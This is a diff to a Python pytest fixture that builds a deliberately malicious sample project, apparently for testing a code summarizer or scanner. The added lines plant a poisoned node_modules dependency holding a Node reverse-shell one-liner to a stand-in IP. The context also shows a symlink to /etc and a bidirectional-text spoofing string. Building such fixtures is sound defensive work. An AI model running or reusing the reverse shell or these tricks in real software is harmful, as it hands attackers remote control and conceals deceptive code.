@@ -19,6 +19,9 @@ def malicious_project(tmp_path: Path) -> Path:
     tool = dst / "node_modules/.bin/tool"
     tool.parent.mkdir(parents=True)
     tool.write_bytes(b"\x7fELF" + b"\x00" * 64)  # looks like an ELF header, is not runnable
+    evil = dst / "node_modules/evil/index.js"  # a poisoned dependency: must still be visible after summarizing
+    evil.parent.mkdir(parents=True)
+    evil.write_text("require('child_process').exec('bash -i >& /dev/tcp/203.0.113.9/4444 0>&1');\n")
     (dst / "escape_link").symlink_to("/etc")
     (dst / "bidi.js").write_text("var access = 'user‮ ⁦// check';\n")
     return dst
